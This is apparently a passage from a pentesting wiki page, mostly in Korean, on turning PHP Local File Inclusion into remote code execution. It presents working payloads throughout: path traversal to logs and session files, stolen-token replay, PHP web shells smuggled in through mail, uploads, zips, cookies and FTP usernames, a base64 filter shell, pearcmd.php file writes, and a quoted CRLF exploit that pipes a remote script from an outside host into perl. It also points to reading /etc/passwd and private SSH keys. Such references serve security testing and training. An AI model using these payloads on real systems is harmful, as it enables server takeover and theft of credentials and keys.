- traversal/LFI를 사용해 web server access log를 읽으세요. 일반 위치:
- /var/log/apache2/access.log, /var/log/httpd/access_log
- /var/log/nginx/access.log
- 일부 엔드포인트는 파일 읽기를 Base64-encoded로 반환합니다. 그런 경우 로컬에서 디코드한 뒤 로그 라인을 확인하세요.
- token 파라미터를 포함한 GET 요청을 grep하여 값을 추출한 뒤, 해당 값을 애플리케이션 entry point에 대해 replay하세요.

Example flow (generic):
```http
GET /vuln/asset?name=..%2f..%2f..%2f..%2fvar%2flog%2fapache2%2faccess.log HTTP/1.1
Host: target
```
본문이 Base64이면 디코드한 다음 캡처한 token을 replay:
```http
GET /portalhome/?AuthenticationToken=<stolen_token> HTTP/1.1
Host: target
```
참고:
- URLs에 포함된 Tokens는 기본적으로 로깅됩니다; 운영 시스템에서는 절대 bearer tokens를 GET으로 받지 마세요.
- 앱이 여러 token 이름을 지원하면 AuthenticationToken, token, sid, access_token 같은 일반적인 키를 찾아보세요.
- logs에 leaked되었을 가능성이 있는 모든 tokens를 교체(rotate)하세요.

### 이메일을 통해

**메일을 보내세요** 내부 계정 (user@localhost)으로 `<?php echo system($_REQUEST["cmd"]); ?>` 같은 PHP payload를 포함한 메일을 보내고, 사용자의 메일을 다음 경로로 include 해 보세요: **`/var/mail/<USERNAME>`** 또는 **`/var/spool/mail/<USERNAME>`**

### Via /proc/\*/fd/\*

1. 많은 shells를 업로드하세요 (예: 100)
2. Include [http://example.com/index.php?page=/proc/$PID/fd/$FD](http://example.com/index.php?page=/proc/$PID/fd/$FD), 여기서 $PID = 프로세스의 PID(무차별 대입 가능)이고 $FD는 파일 디스크립터(역시 무차별 대입 가능)입니다

### Via /proc/self/environ

로그 파일처럼, payload를 User-Agent에 담아 보내면 /proc/self/environ 파일 내에 반영됩니다
```
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```
### 업로드를 통해

파일을 업로드할 수 있다면, 단순히 그 안에 shell payload를 주입하면 된다 (예: `<?php system($_GET['c']); ?>`).
```
http://example.com/index.php?page=path/to/uploaded/file.png
```
파일을 읽기 쉽게 유지하려면 이미지/문서/PDF의 메타데이터에 주입하는 것이 가장 좋습니다

### Zip 파일 업로드를 통해

PHP shell이 포함된 ZIP 파일을 업로드한 뒤 접근:
```python
example.com/page.php?file=zip://path/to/zip/hello.zip%23rce.php
```
### PHP sessions를 통해

웹사이트가 PHP Session (PHPSESSID)을 사용하는지 확인하세요
```
Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
```
PHP에서는 이러한 세션들이 _/var/lib/php5/sess\\_\[PHPSESSID]\_ 파일들에 저장됩니다
```
/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
```
cookie를 `<?php system('cat /etc/passwd');?>`로 설정하세요
```
login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
```
LFI를 사용하여 PHP 세션 파일을 포함하세요.
```
login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm2
```
### ssh를 통해

ssh가 활성화되어 있다면 사용 중인 사용자를 확인(/proc/self/status 및 /etc/passwd)하고 **\<HOME>/.ssh/id_rsa**에 접근을 시도해보세요.

### **를 통해** **vsftpd** _**로그**_

FTP 서버 vsftpd의 로그는 _**/var/log/vsftpd.log**_에 위치합니다. Local File Inclusion (LFI) 취약점이 존재하고 노출된 vsftpd 서버에 접근할 수 있는 경우, 다음 절차를 고려할 수 있습니다:

1. 로그인 과정에서 username 필드에 PHP payload를 주입합니다.
2. 주입 후, LFI를 이용해 서버 로그 _**/var/log/vsftpd.log**_를 가져옵니다.

### php base64 filter를 통해 (base64 사용)

As shown in [this](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64) article, PHP base64 filter just ignore Non-base64. 이를 이용해 파일 확장자 검사 우회가 가능합니다: 만약 ".php"로 끝나는 base64를 공급하면 필터는 "."를 무시하고 base64에 "php"를 덧붙입니다. 예시 payload는 다음과 같습니다:
```url
http://example.com/index.php?page=PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.php

NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
### Via php filters (파일 불필요)

This [**writeup** ](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d) explains that you can use **php filters to generate arbitrary content** as output. Which basically means that you can **generate arbitrary php code** for the include **without needing to write** it into a file.


{{#ref}}
lfi2rce-via-php-filters.md
{{#endref}}

### Via segmentation fault

**Upload** a file that will be stored as **temporary** in `/tmp`, then in the **same request,** trigger a **segmentation fault**, and then the **temporary file won't be deleted** and you can search for it.


{{#ref}}
lfi2rce-via-segmentation-fault.md
{{#endref}}

### Via Nginx temp file storage

If you found a **Local File Inclusion** and **Nginx** is running in front of PHP you might be able to obtain RCE with the following technique:


{{#ref}}
lfi2rce-via-nginx-temp-files.md
{{#endref}}

### Via PHP_SESSION_UPLOAD_PROGRESS

If you found a **Local File Inclusion** even if you **don't have a session** and `session.auto_start` is `Off`. If you provide the **`PHP_SESSION_UPLOAD_PROGRESS`** in **multipart POST** data, PHP will **enable the session for you**. You could abuse this to get RCE:


{{#ref}}
via-php_session_upload_progress.md
{{#endref}}

### Via temp file uploads in Windows

If you found a **Local File Inclusion** and and the server is running in **Windows** you might get RCE:


{{#ref}}
lfi2rce-via-temp-file-uploads.md
{{#endref}}

### Via `pearcmd.php` + URL args

As [**explained in this post**](https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp), the script `/usr/local/lib/phppearcmd.php` exists by default in php docker images. Moreover, it's possible to pass arguments to the script via the URL because it's indicated that if a URL param doesn't have an `=`, it should be used as an argument. See also [watchTowr’s write-up](https://labs.watchtowr.com/form-tools-we-need-to-talk-about-php/) and [Orange Tsai’s “Confusion Attacks”](https://blog.orange.tw/posts/2024-08-confusion-attacks-en/).

The following request create a file in `/tmp/hello.php` with the content `<?=phpinfo()?>`:
```bash
GET /index.php?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=phpinfo()?>+/tmp/hello.php HTTP/1.1
```
다음은 CRLF vuln을 악용하여 RCE를 얻는 예시입니다 (출처: [**here**](https://blog.orange.tw/2024/08/confusion-attacks-en.html?m=1)):
```
http://server/cgi-bin/redir.cgi?r=http:// %0d%0a
Location:/ooo? %2b run-tests %2b -ui %2b $(curl${IFS}orange.tw/x|perl) %2b alltests.php %0d%0a
Content-Type:proxy:unix:/run/php/php-fpm.sock|fcgi://127.0.0.1/usr/local/lib/php/pearcmd.php %0d%0a
%0d%0a
```
### phpinfo()를 통한 (file_uploads = on)

만약 **Local File Inclusion**를 발견했고 **phpinfo()**를 노출하는 파일의 file_uploads = on이면 **RCE**를 얻을 수 있습니다:


{{#ref}}
lfi2rce-via-phpinfo.md
{{#endref}}

### compress.zlib + `PHP_STREAM_PREFER_STUDIO` + Path Disclosure를 통한

만약 **Local File Inclusion**를 발견했고 임시 파일의 경로를 추출할 수 있지만 서버가 포함할 파일에 PHP 마크가 있는지 확인하고 있다면, 이 **Race Condition**으로 그 검사를 **우회**해볼 수 있습니다:


{{#ref}}
lfi2rce-via-compress.zlib-+-php_stream_prefer_studio-+-path-disclosure.md
{{#endref}}

### eternal waiting + bruteforce를 통한

LFI를 악용해 **임시 파일을 업로드**할 수 있고 서버가 PHP 실행을 **멈추게(hang)** 할 수 있다면, 몇 시간 동안 파일명을 **bruteforce**하여 임시 파일을 찾을 수 있습니다:


{{#ref}}
lfi2rce-via-eternal-waiting.md
{{#endref}}

### Fatal Error로

다음 파일들 중 어느 하나를 include하면 `/usr/bin/phar`, `/usr/bin/phar7`, `/usr/bin/phar.phar7`, `/usr/bin/phar.phar`. (같은 파일을 2번 include해야 그 에러가 발생합니다).

**이게 어떻게 유용한지는 모르겠지만 가능성은 있습니다.**\
_PHP Fatal Error를 유발하더라도 업로드된 PHP 임시 파일은 삭제됩니다._ 

<figure><img src="../../images/image (1031).png" alt=""><figcaption></figcaption></figure>


## 참고자료

- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal)
- [PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders)
- [Horizon3.ai – From Support Ticket to Zero Day (FreeFlow Core path traversal → arbitrary write → webshell)](https://horizon3.ai/attack-research/attack-blogs/from-support-ticket-to-zero-day/)
- [Xerox Security Bulletin 025-013 – FreeFlow Core 8.0.5](https://securitydocs.business.xerox.com/wp-content/uploads/2025/08/Xerox-Security-Bulletin-025-013-for-Freeflow-Core-8.0.5.pdf)
- [watchTowr – We need to talk about PHP (pearcmd.php gadget)](https://labs.watchtowr.com/form-tools-we-need-to-talk-about-php/)
- [Orange Tsai – Confusion Attacks on Apache](https://blog.orange.tw/posts/2024-08-confusion-attacks-en/)
- [VTENEXT 25.02 – a three-way path to RCE](https://blog.sicuranext.com/vtenext-25-02-a-three-way-path-to-rce/)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)

- [When Audits Fail: Four Critical Pre-Auth Vulnerabilities in TRUfusion Enterprise](https://www.rcesecurity.com/2025/09/when-audits-fail-four-critical-pre-auth-vulnerabilities-in-trufusion-enterprise/)
- [Positive Technologies – Blind Trust: What Is Hidden Behind the Process of Creating Your PDF File?](https://swarm.ptsecurity.com/blind-trust-what-is-hidden-behind-the-process-of-creating-your-pdf-file/)

{{#file}}
EN-Local-File-Inclusion-1.pdf
{{#endfile}}

{{#include ../../banners/hacktricks-training.md}}
